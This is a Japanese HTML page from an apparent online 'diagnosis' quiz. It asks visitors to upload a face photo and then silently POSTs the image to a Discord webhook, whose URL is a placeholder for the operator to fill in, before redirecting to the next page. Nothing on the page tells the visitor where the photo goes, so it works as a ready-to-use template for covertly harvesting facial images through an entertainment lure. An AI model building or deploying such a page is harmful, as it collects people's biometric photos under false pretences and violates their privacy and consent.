<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>診断ページ２ - 顔写真アップロード</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h2>あなたの顔写真をアップロードしてください</h2>
    <input type="file" id="upload" accept="image/*">
    <button id="sendButton">次に進む</button>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/ここにあなたのWebhookURLを貼ってください";

    document.getElementById("sendButton").addEventListener("click", function () {
      const fileInput = document.getElementById("upload");
      const file = fileInput.files[0];

      if (!file) {
        alert("画像を選んでください！");
        return;
      }

      const formData = new FormData();
      formData.append("file", file);

      fetch(webhookURL, {
        method: "POST",
        body: formData
      })
      .then((response) => {
        if (response.ok) {
          window.location.href = "page3.html";  // 送信成功で次へ
        } else {
          alert("送信に失敗しました。");
        }
      })
      .catch((error) => {
        console.error("エラー:", error);
        alert("送信中にエラーが発生しました。");
      });
    });
  </script>
</body>
</html>
